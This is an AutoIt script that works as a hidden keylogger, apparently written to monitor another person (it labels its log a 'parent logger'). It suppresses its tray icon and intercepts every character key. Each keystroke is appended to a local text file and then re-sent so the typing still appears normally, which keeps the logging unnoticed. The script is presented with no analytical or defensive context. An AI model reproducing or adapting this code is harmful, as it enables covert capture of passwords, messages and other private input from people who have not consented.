#NoTrayIcon
#include <Misc.au3>
_Singleton("olol",0)
For $i = 0 To 256
HotKeySet(Chr($i), "Capt")
Next
FileWrite("parent.txt", @CRLF & "start of parent logger " & @HOUR & ":" & @MIN & ":" & @SEC & " le " & @MDAY & "/" & @MON & "/" & @YEAR & @CRLF & @CRLF)
$i = 0
While 1
sleep(1000)
WEnd
Func Capt()
FileWrite("parent.txt", @HotKeyPressed)
HotKeySet(@HotKeyPressed)
Send(@HotKeyPressed)
HotKeySet(@HotKeyPressed, "Capt")
EndFunc ;==>Capt